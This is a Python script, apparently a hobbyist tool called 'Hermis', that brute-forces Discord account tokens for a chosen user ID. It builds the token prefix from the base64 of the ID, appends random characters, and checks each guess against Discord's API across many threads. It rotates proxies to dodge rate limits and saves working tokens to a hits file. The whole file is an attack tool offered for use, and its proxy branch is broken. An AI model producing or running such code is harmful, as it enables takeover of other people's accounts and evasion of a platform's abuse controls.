import os
import base64
import time
import random
import string
import requests
from colorama import Fore, init, Style
import threading

# Constants
DISCORD_API_URL = 'https://discordapp.com/api/v9/users/@me'
PROXY_FILE_PATH = 'proxies.txt'
HIT_FILE_PATH = 'hit.txt'

# Functions

def print_colored(text, color_code=0):
    print(f"\033[{color_code}m{text}\033[0m")

def clear_console():
    os.system("cls")

def encode_base64(input_str):
    return base64.urlsafe_b64encode(input_str.encode()).decode().rstrip("=")

def generate_random_string(k):
    characters = string.ascii_letters + string.digits + "-_"
    return ''.join(random.choice(characters) for _ in range(k))

def get_token(user_id):
    token = f"{encode_base64(user_id)}.{generate_random_string(6)}.{generate_random_string(38)}"
    return token

def check_proxy(proxy):
    try:
        requests.get('https://www.google.com', proxies={'http': proxy, 'https': proxy}, timeout=5)
        return True
    except requests.RequestException:
        return False

def check_token_validity(token, proxy):
    headers = {'Authorization': token}
    try:
        if proxy:
            if not check_proxy(proxy):
                print_colored(f"{Fore.RED}[-] Proxy not working, skipping token check.{Fore.RESET}")
                return
        else:
            login = requests.get(DISCORD_API_URL, headers=headers)

        if login.status_code == 200:
            print_colored(f"{Fore.GREEN}[+] VALID {token}{Fore.RESET}")
            write_to_file(HIT_FILE_PATH, token)
        else:
            print_colored(f"{Fore.RED}[-] INVALID {token}{Fore.RESET}")
    except requests.exceptions.RequestException as e:
        print_colored(f"{Fore.RED}[-] ERROR OCCURRED {token}")
        print_colored(f"Error details: {e}")

def write_to_file(filename, content):
    with open(filename, 'a+') as f:
        f.write(f'{content}\n')

def read_proxies_from_file(file_path):
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

def print_banner():
    banner = (Fore.MAGENTA + """
    ██   ██ ███████ ██████  ███    ███ ██ ███████ 
    ██   ██ ██      ██   ██ ████  ████ ██ ██      
    ███████ █████   ██████  ██ ████ ██ ██ ███████ 
    ██   ██ ██      ██   ██ ██  ██  ██ ██      ██ 
    ██   ██ ███████ ██   ██ ██      ██ ██ ███████ 
    """ + Fore.LIGHTCYAN_EX)
    print(banner)

def worker(num_tokens, user_id, use_proxies, proxies):
    for _ in range(num_tokens):
        token = get_token(user_id)
        proxy = random.choice(proxies) if use_proxies else None
        check_token_validity(token, proxy)
    time.sleep(2) 
def main():
    init()
    clear_console()
    print_banner()
    print(f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} {Fore.MAGENTA}Hermis{Fore.WHITE} <3")
    time.sleep(3)
    clear_console()

    # Input validation
    while True:
        try:
            num_tokens_to_generate = int(input(
                f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    HOW MANY TOKENS  : {Fore.MAGENTA}"))
            user_id = input(
                f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    USER ID  : {Fore.MAGENTA}")

            if not user_id.isdigit():
                raise ValueError
            break

        except ValueError:
            print(f"{Fore.RED}Please enter a valid number.{Fore.RESET}")

    # Ask the user if they want to use proxies
    use_proxies = input(f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    Use Proxies? (y/n)  : {Fore.MAGENTA}").lower() == 'y'
    proxies = []

    # If using proxies, read proxies from file
    if use_proxies:
        proxies = read_proxies_from_file(PROXY_FILE_PATH)

        # Check if proxies are working
        working_proxies = [proxy for proxy in proxies if check_proxy(proxy)]

        if not working_proxies:
            print_colored(f"{Fore.RED}No working proxies found. Exiting.{Fore.RESET}")
            return
        else:
            print_colored(f"{Fore.GREEN}[+] Proxies are working.{Fore.RESET}")
            proxies = working_proxies

    # Input validation for the number of threads
    while True:
        try:
            num_threads = int(input(
                f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    HOW MANY THREADS  : {Fore.MAGENTA}"))
            if num_threads <= 0:
                raise ValueError
            break
        except ValueError:
            print_colored(f"{Fore.RED}Please enter a valid number greater than 0.{Fore.RESET}")

    # Warning for using many threads without proxies
    if num_threads > 10 and not use_proxies:
        print_colored(f"{Fore.RED}[!] WARNING: Using many threads without proxies may result in rate limiting or IP suspension from Discord.{Fore.RESET}")
    time.sleep(5)
    clear_console()

    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(num_tokens_to_generate, user_id, use_proxies, proxies))
        threads.append(thread)

    # Start the threads
    for thread in threads:
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    time.sleep(1.5)
    clear_console()
    print_banner()
    print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Finished generating\n{Fore.CYAN}[$]{Style.RESET_ALL}    Press Enter to exit..")
    input()

if __name__ == "__main__":
    main()
